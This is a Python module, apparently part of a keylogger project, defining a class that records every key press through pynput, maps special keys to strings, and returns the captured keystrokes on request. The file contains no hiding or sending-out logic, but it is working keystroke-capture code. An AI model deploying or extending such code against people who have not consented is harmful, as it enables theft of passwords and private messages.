from keylogger.inter_face import IKeyLogger
from typing import List
from pynput.keyboard import Key, Listener, KeyCode

# יבוא מקובץ תווים מיוחדים
from keylogger.special_characters import special_keys


class KeyloggerService(IKeyLogger):
    def __init__(self):
        self.presses = list()
        self.listener = None

    def start_logging(self) -> None:
        self.listener = Listener(on_press= self.press)
        self.listener.start()

    def stop_logging(self) -> None:
        self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        result = self.presses
        self.presses = list()
        return result


    def key_to_string(self,key):
        if isinstance(key, KeyCode):
            return key.char or ""
        return special_keys.get(key, f"<{key}>")


    def press(self,key):
        key_str = self.key_to_string(key)
        if key_str == "<ESC>":
            self.stop_logging()
        self.presses.append(key_str)

